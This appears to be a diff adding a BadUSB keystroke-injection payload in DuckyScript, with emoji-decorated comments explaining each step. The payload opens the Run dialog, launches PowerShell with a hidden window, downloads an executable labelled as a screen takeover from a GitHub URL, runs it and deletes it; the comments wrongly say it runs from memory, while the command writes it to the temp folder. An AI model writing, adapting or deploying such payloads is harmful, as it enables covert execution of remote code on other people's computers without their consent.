@@ -1,0 +1,12 @@
+REM 🖥️ Payload created by Aries-Hecker 🖥️
+REM ⏳ It takes 4.32 seconds to inject ⏳
+REM 💡 Explanation of how it works: 
+REM - The script opens the "Run" dialog (Win+R) 🏃‍♂️
+REM - Then, it uses PowerShell to download the file in memory 💾
+REM - The file is executed directly from memory, and it’s deleted after execution 🧹
+REM - The PowerShell window will be hidden during execution 👀
+
+GUI r
+DELAY 1
+STRING powershell -WindowStyle Hidden -Command "$tempFile = [System.IO.Path]::Combine($env:TEMP, 'Spiral.exe'); (New-Object System.Net.WebClient).DownloadFile('https://github.com/Aries-Heker/Python-Tk-spiral/raw/main/ScreenTakeoverEXE/Spiral.exe', $tempFile); Start-Process $tempFile; Remove-Item $tempFile -Force"
+ENTER
